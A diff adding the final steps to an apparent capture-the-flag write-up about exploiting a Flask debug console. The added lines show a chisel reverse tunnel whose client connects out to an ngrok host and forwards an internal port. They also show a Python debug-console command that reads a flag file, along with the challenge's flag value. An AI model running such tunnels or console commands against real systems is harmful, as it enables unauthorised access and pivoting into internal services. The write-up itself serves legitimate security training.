@@ -882,8 +882,19 @@ Let's restart the app with the knowledge we acquired earlier when analysing the 
 
 After a minute, flaskdev's instance should have rebooted, we can kill our own.
 
+To port forward is this way:
+
+```
+Host: chisel server -p 80 --reverse
+Target: ./chisel client 7.tcp.eu.ngrok.io:11451 R:8001:127.0.0.1:1337 &
+```
+
 We can now access the debugging console and get the flag.
 
+```python
+>>> import os ; os.popen('cat /home/flaskdev/flag.txt').read()
+'Hero{n0t_s0_Urandom_4ft3r_4ll}\n'
+```
 
-
+And we're done 👻
 
